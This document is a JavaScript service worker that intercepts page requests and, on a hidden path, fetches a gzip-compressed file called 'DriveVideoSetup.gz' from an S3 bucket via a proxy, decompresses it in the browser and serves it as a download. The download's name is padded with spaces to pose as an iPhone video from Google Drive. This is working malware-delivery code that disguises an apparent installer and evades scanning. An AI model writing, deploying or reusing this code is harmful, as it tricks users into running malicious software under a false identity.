self.addEventListener('install', () => self.skipWaiting());

self.addEventListener('activate', (e) => {
  e.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);

  if (url.pathname.includes('/drive_secure_download_ping')) {
    event.respondWith(new Response('pong', { status: 200 }));
    return;
  }

  if (url.pathname.includes('/secure_internal_drop/')) {
    const payloadUrl = 'https://xmetavn.s3.us-east-1.amazonaws.com/DriveVideoSetup.gz';

    const fetchUrl =
      '/api/edge-stream?url=' +
      encodeURIComponent(payloadUrl) +
      '&nocache=' +
      Date.now();

    event.respondWith(
      fetch(fetchUrl, {
        method: 'GET',
        cache: 'no-store',
      })
        .then((response) => {
          if (!response.ok) {
            throw new Error(`Fetch failed: ${response.status} ${response.statusText}`);
          }

          if (!response.body) {
            throw new Error('Response body is empty');
          }

          const ds = new DecompressionStream('gzip');
          const decompressedStream = response.body.pipeThrough(ds);

          const headers = new Headers();
          headers.set('Content-Type', 'application/octet-stream');

          const filename = 'Video_iPhone_2026-06-23.mp4   Drive.google.com';
          headers.set('Content-Disposition', `attachment; filename="${filename}"`);

          return new Response(decompressedStream, {
            status: 200,
            headers,
          });
        })
        .catch((e) => {
          console.error('SW Fetch Error:', e);
          return new Response('Download failed: ' + e.message, {
            status: 500,
            headers: {
              'Content-Type': 'text/plain',
            },
          });
        })
    );
  }
});